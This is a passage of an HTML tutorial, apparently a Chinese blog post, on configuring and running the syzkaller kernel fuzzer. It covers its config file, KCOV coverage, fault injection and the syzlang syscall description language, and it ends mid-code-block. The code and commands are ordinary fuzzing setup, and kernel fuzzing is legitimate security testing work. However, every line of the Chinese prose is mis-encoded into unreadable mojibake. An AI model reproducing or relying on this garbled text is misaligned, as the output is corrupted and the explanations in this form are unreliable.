åˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶<code>my.cfg</code>ï¼Œè¿™ä¸ªé…ç½®æ–‡ä»¶å°†æŒ‡å®šä¸€äº›å‚æ•°ï¼Œå¦‚ç›®æ ‡å†…æ ¸ã€å†…æ ¸è°ƒè¯•ç¬¦å·ã€æ‰§è¡Œçš„æµ‹è¯•ç±»å‹ç­‰ã€‚</p><p>å½“ä»¥ä¸Šç¯å¢ƒæ­å»ºå®Œæˆåï¼Œå°±å¯ä»¥å¼€å§‹ç¼–å†™ syzkaller çš„é…ç½®æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯å®˜æ–¹çš„é…ç½®ç¤ºä¾‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># my.cfg</span><br>&#123;<br>  <span class="hljs-attr">&quot;target&quot;:</span> <span class="hljs-string">&quot;linux/amd64&quot;</span>,<br>  <span class="hljs-attr">&quot;http&quot;:</span> <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span>,<br>  <span class="hljs-attr">&quot;workdir&quot;:</span> <span class="hljs-string">&quot;/root/linux/workdir/&quot;</span>,<br>  <span class="hljs-attr">&quot;kernel_obj&quot;:</span> <span class="hljs-string">&quot;/root/linux/&quot;</span>,<br>  <span class="hljs-attr">&quot;image&quot;:</span> <span class="hljs-string">&quot;/root/linux/image/bullseye.img&quot;</span>,<br>  <span class="hljs-attr">&quot;sshkey&quot;:</span> <span class="hljs-string">&quot;/root/linux/image/bullseye.id_rsa&quot;</span>,<br>  <span class="hljs-attr">&quot;syzkaller&quot;:</span> <span class="hljs-string">&quot;/tools/binary/syzkaller/&quot;</span>,<br>  <span class="hljs-attr">&quot;procs&quot;:</span> <span class="hljs-number">8</span>,<br>  <span class="hljs-attr">&quot;type&quot;:</span> <span class="hljs-string">&quot;qemu&quot;</span>,<br>  <span class="hljs-attr">&quot;vm&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;count&quot;:</span> <span class="hljs-number">4</span>,<br>    <span class="hljs-attr">&quot;kernel&quot;:</span> <span class="hljs-string">&quot;/root/linux/arch/x86/boot/bzImage&quot;</span>,<br>    <span class="hljs-attr">&quot;cmdline&quot;:</span> <span class="hljs-string">&quot;net.ifnames=0&quot;</span>,<br>    <span class="hljs-attr">&quot;cpu&quot;:</span> <span class="hljs-number">2</span>,<br>    <span class="hljs-attr">&quot;mem&quot;:</span> <span class="hljs-number">2048</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">syz-manager -config=my.cfg<br></code></pre></td></tr></table></figure><ul><li><strong>http</strong> - ç”¨æˆ·ç•Œé¢å¼€æ”¾åœ¨æœ¬åœ°çš„ 56741 ç«¯å£</li><li><strong>image</strong> - å…ˆå‰ç”Ÿæˆçš„é•œåƒè·¯å¾„</li><li><strong>syzkaller</strong> - syzkaller é¡¹ç›®çš„æ ¹ç›®å½•ï¼Œè¿™é‡Œä¼šæ ¹æ®å®‰è£… syzkaller çš„æ–¹å¼æœ‰æ‰€ä¸åŒ</li></ul><p>æ¥ä¸‹æ¥æ˜¯ä¸€äº› VM é…ç½®ï¼Œæ¯”å¦‚ VM ä½¿ç”¨ QEMU è¿è¡Œã€å¯ç”¨å››å° VMï¼Œæ¯å°çš„ç¡¬ä»¶èµ„æºå’Œ kernel image è·¯å¾„ç­‰ã€‚</p><p>ä¸€ä½† syzkaller åœ¨å…¶ä¸­ä¸€ä¸ª VM ä¸­æ£€æµ‹åˆ°å†…æ ¸å´©æºƒï¼Œå®ƒå°†è‡ªåŠ¨é‡ç°æ­¤å´©æºƒçš„è¿‡ç¨‹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå°†ä½¿ç”¨ 4 ä¸ª VM æ¥é‡æ–°å´©æºƒï¼Œç„¶åæœ€å°åŒ–å¯¼è‡´å´©æºƒçš„é‡æ–°ã€‚</p><h3 id="æ‰§è¡Œ"><a href="#æ‰§è¡Œ" class="headerlink" title="æ‰§è¡Œ"></a>æ‰§è¡Œ</h3><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥è¿è¡Œ syzkallerï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">syz-manager -config=my.cfg<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåè®¿é—®ç”¨æˆ·ç•Œé¢ <a href="http://localhost:56741/">http://localhost:56741</a> (é»˜è®¤)ï¼Œä½ å°†çœ‹åˆ°ä»¥ä¸‹ç•Œé¢ï¼Œä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼š</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/26-1.png" alt="img"></p><p>é€šè¿‡åŠ ä¸Š<code>-debug</code>å‚æ•°å¯ä»¥æ’æŸ¥ syzkaller è¿è¡Œå¤±è´¥çš„é—®é¢˜ï¼Œå‚æ•°ä¼šå±•ç¤º<code>syz-executor</code>çš„æ‰§è¡Œæƒ…å†µã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">syz-manager -config configure.json --debug<br></code></pre></td></tr></table></figure><p>åœ¨å®¿ä¸»æœºè¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -aux | grep qemu<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤ä¼šæ˜¾ç¤º<code>syz-manager</code>ä¼ ç»™ qemu çš„é€‰é¡¹ï¼Œä¸€äº›ä¸åˆé€‚çš„å‚æ•°å¯èƒ½ä¼šå¯¼è‡´<code>syz-manager</code>æŠ¥é”™ã€‚ä½ å¯ä»¥ä¿®æ”¹è¿™äº›å‚æ•°å¹¶æ‰‹åŠ¨è¿è¡Œ qemu è¿›è¡Œæ’æŸ¥ã€‚ä¸€éƒ¨åˆ†å‚æ•°æ¥è‡ªé…ç½®æ–‡ä»¶ï¼Œå¦ä¸€éƒ¨åˆ†ä¸ºé»˜è®¤å€¼ï¼Œä½äº <code>syzkaller/vm/qemu/qemu.go</code>ã€‚ä½ å¯ä»¥ä¿®æ”¹æºç å¹¶é‡æ–°æ„å»ºä»¥é€‚é…ä½ çš„æœºå™¨ç¯å¢ƒã€‚</p><p>æ£€æŸ¥æ˜¯å¦å¯ä»¥ ssh è¿æ¥åˆ°è™šæ‹Ÿæœº</p><p>æ‰©å±•ç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰</p><p>æˆ‘ä¸»è¦åœ¨ Linux&#x2F;X86_64 å¹³å°ä¸Šä½¿ç”¨ syzkallerã€‚å°†ä½ æ–°å¢çš„ syscall æè¿°å†™å…¥ <code>$(SYZKALLER)/sys/linux/*.txt</code>ï¼Œç„¶åè¿è¡Œï¼š</p><p>make HOSTOS&#x3D;linux HOSTARCH&#x3D;amd64 TARGETOS&#x3D;linux TARGETARCH&#x3D;amd64 SOURCEDIR&#x3D;$(YOUR_KERNEL_SOURCE_DIR) extract<br>make HOSTOS&#x3D;linux HOSTARCH&#x3D;amd64 TARGETOS&#x3D;linux TARGETARCH&#x3D;amd64 SOURCEDIR&#x3D;$(YOUR_KERNEL_SOURCE_DIR) generate<br>make HOSTOS&#x3D;linux HOSTARCH&#x3D;amd64 TARGETOS&#x3D;linux TARGETARCH&#x3D;amd64 SOURCEDIR&#x3D;$(YOUR_KERNEL_SOURCE_DIR) -jN</p><p>è¿™ä¼šä½¿ç”¨ä½ è‡ªå®šä¹‰çš„ syscall é‡å»º syzkallerã€‚ç„¶åç”¨ <code>scp</code> å°†ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶æ‹·è´åˆ° VM ä¸­ã€‚</p><h4 id="ä½¿ç”¨-systemtap-ç›‘æ§è¿œç¨‹-VM"><a href="#ä½¿ç”¨-systemtap-ç›‘æ§è¿œç¨‹-VM" class="headerlink" title="ä½¿ç”¨ systemtap ç›‘æ§è¿œç¨‹ VM"></a>ä½¿ç”¨ systemtap ç›‘æ§è¿œç¨‹ VM</h4><p>æˆ‘ä½¿ç”¨ systemtap æ¥éªŒè¯ fuzzer æ‰§è¡Œåä»£ç æ˜¯å¦å¯è¾¾ã€‚ä½ å¯ä»¥é€šè¿‡ç¼–å†™è‡ªå·±çš„ <code>.stap</code> è„šæœ¬æ¥æ‰©å±•åŠŸèƒ½ã€‚ <a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/systemtap.md">è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨ systemtap ç›‘æ§è¿œç¨‹ VM çš„æ•™ç¨‹</a>ï¼Œ<a href="https://chatgpt.com/c/6829fdb6-008c-8003-aec2-7b77b5b0f522">è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹</a>å±•ç¤ºäº† fuzzer è§¦å‘æŸä¸ªå†…æ ¸å¤„ç†å‡½æ•°çš„æ¬¡æ•°ã€‚</p><h4 id="KCOVï¼ˆè¦†ç›–ç‡ï¼‰"><a href="#KCOVï¼ˆè¦†ç›–ç‡ï¼‰" class="headerlink" title="KCOVï¼ˆè¦†ç›–ç‡ï¼‰"></a>KCOVï¼ˆè¦†ç›–ç‡ï¼‰</h4><p>syzkaller ä½¿ç”¨ KCOV æ”¶é›†è¦†ç›–ä¿¡æ¯ã€‚æ¯ä¸ªå®ä¾‹éƒ½ä¼šåˆå§‹åŒ– KCOV æ¥å£ï¼Œæ¥å£ä½äº <code>/sys/kernel/debug/kcov</code>ï¼Œé€šè¿‡ <code>ioctl</code> å¯ç”¨&#x2F;ç¦ç”¨ã€‚å®ç°ä»£ç åœ¨ <code>executor/executor_linux.cc</code> ä¸­ï¼Œä¸€ç³»åˆ— <code>cover_*</code> å‡½æ•°è´Ÿè´£å¤„ç†ã€‚</p><p>æ³¨æ„ï¼šä¸ºäº†è·å¾—å®Œæ•´çš„è°ƒè¯•ä¿¡æ¯ï¼Œ<code>syz-manager</code> çš„é…ç½®æ–‡ä»¶ä¸­å¿…é¡»æŒ‡å®šæ­£ç¡®çš„ vmlinux æ–‡ä»¶ã€‚ä½ å¯ä»¥é€šè¿‡è®¿é—® syzkaller çš„ Web æœåŠ¡æŸ¥çœ‹è¦†ç›–ä¿¡æ¯ï¼š</p><p><a href="http://127.0.0.1:$(PORT)/cover">http://127.0.0.1:$(PORT)/cover</a></p><p>KCOV ä¼šç”¨ä¸åŒé¢œè‰²æ˜¾ç¤ºå·²è¦†ç›–çš„åˆ†æ”¯ã€‚å†…æ ¸æ¨¡å—çš„è¦†ç›–ä¿¡æ¯æœªåŒ…å«åœ¨å†…ã€‚</p><h4 id="æ•…éšœæ³¨å…¥ï¼ˆFault-injectionï¼‰"><a href="#æ•…éšœæ³¨å…¥ï¼ˆFault-injectionï¼‰" class="headerlink" title="æ•…éšœæ³¨å…¥ï¼ˆFault-injectionï¼‰"></a>æ•…éšœæ³¨å…¥ï¼ˆFault-injectionï¼‰</h4><p>syzkaller åœ¨è¿è¡Œæ—¶ä½¿ç”¨å†…å­˜ç®¡ç†ç›¸å…³çš„å¤±è´¥æ³¨å…¥æœºåˆ¶ã€‚å¦ä¸€ç§æœ‰ç”¨çš„æ³¨å…¥æ–¹å¼æ˜¯å‘æŒ‡å®šçš„å†…æ ¸å‡½æ•°æ³¨å…¥é”™è¯¯è¿”å›å€¼ã€‚è¿™æ˜¯é€šè¿‡ kprobe + sysfs å®ç°çš„ï¼Œå¯¹ç”¨æˆ·ç©ºé—´æš´éœ²äº† <code>/sys/kernel/debug/fail_function</code> æ¥å£ã€‚</p><p>syzkaller ä½¿ç”¨çš„æ•…éšœæ³¨å…¥ä»£ç ä½äºï¼š <code>$SYZ_SRC/pkg/host/host_linux.go</code></p><h3 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h3><p>æ¨¡æ¿è¯­æ³•ï¼š</p><p>å†…æ ¸fuzzæ¨¡å‹ï¼š</p><ul><li>åˆ¶å¯¼</li><li>å´©æºƒé‡å¯ æˆ‘ä»¬é€šè¿‡è™šæ‹Ÿæœºæ¥è¿è¡Œå†…æ ¸ï¼Œå¦‚æœå†…æ ¸å´©æºƒå³é‡æ–°å¯åŠ¨è™šæ‹Ÿæœº</li><li>äº¤äº’ fuzz &lt;&#x3D;&gt; ç›®æ ‡ç¨‹åº è·å–ç›®æ ‡è¿›ç¨‹è¿è¡ŒçŠ¶æ€ syzkalleré€šè¿‡sshä¸å†…æ ¸äº¤äº’</li><li>æ ·æœ¬ä»€ä¹ˆæ ¼å¼ï¼Œå¦‚ä½•è®©å†…æ ¸è§£æå®ƒï¼Ÿç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶</li><li>æŠ•å–‚æ ·æœ¬ æ‰§è¡ŒäºŒè¿›åˆ¶</li></ul><p>å†…æ ¸æ€å¦‚ä½•æ’æ¡©ï¼Ÿkcov</p><p>å¦‚ä½•å°†å†…æ ¸çš„ä»£ç è¦†ç›–ç‡æƒ…å†µåé¦ˆç»™ä¸» fuzzç¨‹åºã€‚</p><p>è¢« kcov ç¼–è¯‘çš„å†…æ ¸è¿è¡Œèµ·æ¥åï¼Œä¼šç”Ÿæˆä¸€ä¸ª kcov æ–‡ä»¶ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æˆ‘ä»¬å¯ä»¥çŸ¥é“å½“å‰å†…æ ¸çš„ä»£ç æ‰§è¡Œæƒ…å†µã€‚</p><p>ç›®æ ‡ï¼šæœªæˆæƒå†™ç‰¹æƒæ–‡ä»¶</p><p>ç‰¹å¾ï¼šæ™®é€šç”¨æˆ·+åªè¯»æ–‡ä»¶ &#x3D;&gt; æ–‡ä»¶å†…å®¹å‘ç”Ÿå˜åŒ–</p><p>è§£å†³ï¼šæ™®é€šç”¨æˆ·æ‰§è¡Œ+è‡ªå»ºåªè¯»æ–‡ä»¶</p><p>syzkaller é€šè¿‡ç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶ç„¶åé€šè¿‡ ssh æœåŠ¡ä¼ è¾“åˆ°ç›®æ ‡å†…æ ¸ä¸­è¿è¡Œæ¥ fuzz</p><h2 id="syzlang"><a href="#syzlang" class="headerlink" title="syzlang"></a>syzlang</h2><p>syzkaller è‡ªå·±å®šä¹‰äº†ä¸€å¥—æè¿°ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿çš„å£°æ˜å¼è¯­è¨€ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæè¿°æ–‡ä»¶ã€‚</p><p>ä¸ºäº†æé«˜ fuzz çš„æ•ˆç‡ï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºç›®æ ‡ç³»ç»Ÿé‡èº«å®šåˆ¶è¿™ç§å£°æ˜æ–‡ä»¶ã€‚é€šå¸¸ä¸€ä¸ªè®¾å¤‡èŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªå£°æ˜æ–‡ä»¶ã€‚</p><p>æ‰€è°“çš„å£°æ˜æ–‡ä»¶å°±æ˜¯ä¸€ä¸ª txtï¼Œæ ¹æ®syzkallerå®šä¹‰çš„è¯­æ³•ï¼Œåœ¨è¿™ä¸ªtxtæ–‡æ¡£ä¸­æè¿°è®¾å¤‡èŠ‚ç‚¹çš„æ¥å£ä¿¡æ¯ä»¥åŠå‚æ•°æ ¼å¼ã€‚</p><h3 id="syzlang-1"><a href="#syzlang-1" class="headerlink" title="syzlang"></a>syzlang</h3><p>syzkaller è‡ªå®šä¹‰äº†ä¸€ç§è¯­è¨€ syzlang æ¥æè¿°ç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰çš„æ ¼å¼ï¼Œæ¯”å¦‚ syscall ç¼–å·ã€å‚æ•°ã€è¿”å›ç±»å‹ç­‰ï¼Œ<a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md">å®˜æ–¹æ–‡æ¡£</a>å·²ç»è¯¦ç»†è¯´æ˜äº†æ ¼å¼ï¼Œè¿™é‡Œæä¾›ä¸€ä¸ªç®€æ´çš„ä¸­æ–‡æ‡’äººåŒ…ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒç°æˆçš„æ–‡ä»¶ <code>sys/linux/sys.txt</code>ï¼Œè¯¥æ–‡ä»¶å¼€å¤´ä¼šåŒ…å«ä¸€äº› kernel header æ–‡ä»¶ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶ä¸­ä½¿ç”¨çš„å¸¸é‡æˆ–å®šä¹‰å€¼æ¥è‡ªå“ªäº›æ–‡ä»¶ã€‚å®é™…ä¸Šï¼Œsyzkaller åœ¨è§£æå®Œ kernel header æ–‡ä»¶åï¼Œä¼šå°†å…¶å­˜å‚¨åˆ° <code>sys.txt.const</code> æ–‡ä»¶ä¸­ï¼Œå¯ä»¥éšæ„æ·»åŠ  <code>include &lt;hello/world&gt;</code> å¹¶ç¼–è¯‘è§‚å¯Ÿï¼Œç¼–è¯‘åå¹¶ä¸ä¼šæŠ¥é”™ï¼Œå› ä¸º syzlang è§£æå™¨æ ¹æœ¬ä¸ä¼šå¤„ç†è¿™ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs openscad"><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;linux/socket.h&gt;</span><br><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;linux/ptrace.h&gt;</span><br><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;linux/resource.h&gt;</span><br><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;linux/stat.h&gt;</span><br>...<br><span class="hljs-meta"><span class="hljs-keyword">include</span> &lt;hello/world&gt;</span><br></code></pre></td></tr></table></figure><p>è§£æ header æ–‡ä»¶åç”Ÿæˆçš„ <code>sys.txt.const</code> æ–‡ä»¶å¯èƒ½åŒ…å«å¦‚ä¸‹å†…å®¹ï¼Œè¿™æ˜¯ä¸€äº›å®å±•å¼€çš„å€¼æˆ–å¸¸é‡ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ADDR_COMPAT_LAYOUT <span class="hljs-operator">=</span> <span class="hljs-number">2097152</span><br>ADDR_LIMIT_32BIT <span class="hljs-operator">=</span> <span class="hljs-number">8388608</span><br>ADDR_LIMIT_3GB <span class="hljs-operator">=</span> <span class="hljs-number">134217728</span><br>ADDR_NO_RANDOMIZE <span class="hljs-operator">=</span> <span class="hljs-number">262144</span><br>ADJ_ESTERROR <span class="hljs-operator">=</span> <span class="hljs-number">8</span><br>...<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šå®šä¹‰ä¸€äº›ç±»å‹ï¼Œæ¯”å¦‚ <code>alignptr</code>ã€<code>align32</code> å’Œ <code>align64</code>ï¼Œè¿™äº›ç±»å‹ä¼šæ¥æ”¶å¦ä¸€ä¸ªç±»å‹ <code>T</code> å¹¶è‡ªåŠ¨å¯¹é½åˆ°ç‰¹å®šå­—èŠ‚ï¼š</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> alignptr[<span class="hljs-type">T</span>] &#123;<br>v<span class="hljs-type">T</span><br>&#125; [align[<span class="hljs-type">PTR_SIZE</span>]]<br><br><span class="hljs-keyword">type</span> align32[<span class="hljs-type">T</span>] &#123;<br>v<span class="hljs-type">T</span><br>&#125; [align[4]]<br><br><span class="hljs-keyword">type</span> align64[<span class="hljs-type">T</span>] &#123;<br>v<span class="hljs-type">T</span><br>&#125; [align[8]]<br></code></pre></td></tr></table></figure><p>ç±»å‹å®šä¹‰è¯­æ³•ç±»ä¼¼äº C çš„ <code>typedef</code>ï¼Œè€Œ <code>[0:65]</code> è¡¨ç¤ºè¯¥ç±»å‹çš„å€¼èŒƒå›´æ˜¯ 0 åˆ° 65ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">signalno </span>int32[<span class="hljs-number">0</span>:<span class="hljs-number">65</span>]<br><span class="hljs-keyword">type</span> <span class="hljs-type">signalnoptr </span>intptr[<span class="hljs-number">0</span>:<span class="hljs-number">65</span>]<br>...<br></code></pre></td></tr></table></figure><p>æ¥ç€æ˜¯å®šä¹‰ syscall æ ¼å¼çš„éƒ¨åˆ†ï¼ŒåŒ…æ‹¬ <code>open()</code> å’Œ <code>openat()</code> çš„å‚æ•°ä¸è¿”å›å€¼ã€‚<code>$dir</code> è¡¨ç¤º <code>open()</code> çš„ä¸€ä¸ªç‰¹å®šæ ¼å¼ï¼Œ<code>sock_fprog</code> å®šä¹‰äº†ä¸€ä¸ªæ–°çš„ç»“æ„ä½“ï¼Œ<code>open_flags</code> å®šä¹‰äº†ä¸€ä¸ªå€¼é›†åˆã€‚å‚æ•°éƒ¨åˆ†ä»¥ <code>open()</code> ä¸ºä¾‹ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">open</span><span class="hljs-params">(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode])</span></span> fd<br>open<span class="hljs-variable">$dir</span>(file ptr<span class="hljs-selector-attr">[in, filename]</span>, flags flags<span class="hljs-selector-attr">[open_flags]</span>, mode flags<span class="hljs-selector-attr">[open_mode]</span>) fd_dir<br><br>openat<span class="hljs-variable">$dir</span>(...) fd_dir<br><span class="hljs-function"><span class="hljs-title">openat</span><span class="hljs-params">(...)</span></span> fd<br><br>sock_fprog &#123;<br>lenlen<span class="hljs-selector-attr">[filter, int16]</span><br><span class="hljs-attribute">filter</span>ptr[in, array[sock_filter]]<br>&#125;<br><br>open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE<br></code></pre></td></tr></table></figure><ul><li><code>file</code>ã€<code>flags</code> å’Œ <code>mode</code> æ˜¯å‚æ•°çš„åç§°ï¼Œ<code>fd</code> æ˜¯è¿”å›å€¼çš„åç§°ã€‚</li><li><code>in</code> å’Œ <code>out</code> ç”¨æ¥å®šä¹‰æ•°æ®æµçš„é¡ºåºï¼Œ<code>in</code> è¡¨ç¤ºè¾“å…¥æ•°æ®ï¼Œ<code>out</code> è¡¨ç¤ºè¾“å‡ºç»“æœã€‚</li><li><code>ptr</code> å’Œ <code>flags</code> åˆ™æ˜¯å‚æ•°ç±»å‹ï¼Œ<code>ptr</code> è¡¨ç¤ºæŒ‡å‘æŸå¯¹è±¡ï¼ˆå¦‚ <code>filename</code>ï¼‰çš„æŒ‡é’ˆï¼Œå¯ä»¥é¢å¤–å®šä¹‰æŒ‡é’ˆå±æ€§ï¼Œè€Œ <code>flags</code> åˆ™è¡¨ç¤ºä¸€ç»„æ•°å€¼ï¼Œåœ¨å˜å¼‚æ—¶ä¼šä»ä¸­é€‰æ‹©ä¸€ä¸ªæˆ–å¤šä¸ªä½œä¸º <code>flags</code> å‚æ•°ã€‚</li><li><code>filename</code> æ˜¯ <code>string</code> ç±»å‹çš„ç‰¹ä¾‹ï¼Œè¡¨ç¤ºå¯ä»¥åœ¨æ‰§è¡Œæ—¶äº§ç”Ÿåˆæ³•çš„æ–‡ä»¶åã€‚</li></ul><p>åœ¨ <code>sys.txt.const</code> æ–‡ä»¶ä¸­ï¼Œè¿˜å®šä¹‰äº†ä¸åŒæŒ‡ä»¤é›†ä¸‹çš„ syscall ç¼–å·ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">__NR_acct = 51, amd64:163, arm64:riscv64:89, mips64le:5158<br>__NR_alarm = 27, amd64:37, arm64:riscv64:???, mips64le:5037<br>__NR_brk = 45, amd64:12, arm64:riscv64:214, mips64le:5012<br>...<br></code></pre></td></tr></table></figure><hr><p>é™¤äº† <code>sys.txt</code> æ–‡ä»¶å¤–ï¼Œ<code>sys/linux/</code> ç›®å½•ä¸‹è¿˜æœ‰è®¸å¤š <code>*.txt</code> æ–‡ä»¶ï¼Œ<code>sys.txt</code> å®šä¹‰äº†æ›´å¤šé€šç”¨çš„ syscall æ ¼å¼ï¼Œè€Œå…¶ä»– <code>*.txt</code> æ–‡ä»¶åˆ™å®šä¹‰äº†ä¸å­ç³»ç»Ÿé€šä¿¡çš„ syscallã€‚ä¾‹å¦‚ï¼Œ<code>bpf.txt</code> å®šä¹‰äº†ä¸ Linux eBPF ç³»ç»Ÿäº¤äº’çš„ syscallã€‚</p><p>ä¿®æ”¹å®Œè¿™äº›æ–‡ä»¶åï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ›´æ–°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bin/syz-sysgen<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œ<code>syz-sysgen</code> å°±æ˜¯ syzlang çš„è§£æå™¨ï¼Œå®ƒä¼šè¯»å–è¿™äº› â€œæºä»£ç â€ï¼Œå¹¶ç”Ÿæˆ â€œè¾“å‡ºæ–‡ä»¶â€ï¼Œä¾‹å¦‚ <code>sys/linux/gen/amd64.go</code>ã€‚ä¸åŒæŒ‡ä»¤é›†ä¸æ“ä½œç³»ç»Ÿçš„æ ¼å¼ä¼šç”Ÿæˆå¯¹åº”çš„æ–‡ä»¶ï¼Œå¦‚ <code>sys/$OS/gen/$INSN.go</code>ã€‚ä¸‹é¢æ˜¯ <code>amd64.go</code> çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥æ¸…æ¥šçœ‹åˆ° syzlang è§£æå™¨ï¼ˆå³ <code>syz-sysgen</code>ï¼‰æ‰€åšçš„æ“ä½œï¼š</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> gen<br><br><span class="hljs-keyword">import</span> . <span class="hljs-string">&quot;github.com/google/syzkaller/prog&quot;</span><br><span class="hljs-keyword">import</span> . <span class="hljs-string">&quot;github.com/google/syzkaller/sys/linux&quot;</span><br><br><span class="hljs-comment">// RegisterTarget() ä¼šå‘ fuzzer æ³¨å†Œ Linux AMD64 çš„ syscall æ ¼å¼ã€è§„åˆ™ä»¥åŠå¸¸æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>    RegisterTarget(&amp;Target&#123;OS: <span class="hljs-string">&quot;linux&quot;</span>, Arch: <span class="hljs-string">&quot;amd64&quot;</span>, Revision: revision_amd64, PtrSize: <span class="hljs-number">8</span>, PageSize: <span class="hljs-number">4096</span>, NumPages: <span class="hljs-number">4096</span>, DataOffset: <span class="hljs-number">536870912</span>, 